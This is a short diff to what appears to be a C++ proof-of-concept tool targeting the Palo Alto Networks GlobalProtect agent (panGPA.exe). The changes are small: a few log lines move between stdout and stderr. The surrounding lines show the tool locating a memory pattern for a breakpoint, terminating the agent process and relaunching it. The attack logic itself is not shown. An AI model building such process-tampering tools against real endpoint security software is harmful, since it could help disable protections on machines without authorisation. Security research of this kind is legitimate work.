@@ -308,7 +308,7 @@ int main() {
         std::cout << "[*] Pattern found at address: " << std::hex << breakpointAddress << std::endl;
     }
     else {
-        std::cout << "[!] Pattern not found." << std::endl;
+        std::cerr << "[!] Pattern not found." << std::endl;
         return 1;
     }
 
@@ -367,13 +367,13 @@ int main() {
     }
     
     // Clean up
-    std::cerr << "[*] Cleaning Up ..." << std::endl;
+    std::cout << "[*] Cleaning Up ..." << std::endl;
 
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
     TerminateProcess(pi.hProcess, 0);
 
-    std::cerr << "[*] Relaunching panGPA ..." << std::endl;; //  because I literally cannot be f@#ked to worry about restarting suspended threads for the PoC - see TODO etc." << std::endl;
+    std::cout << "[*] Relaunching panGPA ..." << std::endl;; //  because I literally cannot be f@#ked to worry about restarting suspended threads for the PoC - see TODO etc." << std::endl;
     if (!CreateProcess(L"C:\\Program Files\\Palo Alto Networks\\GlobalProtect\\panGPA.exe", nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
         std::cerr << "Failed to restart process. Error: " << GetLastError() << std::endl;
         return 1;
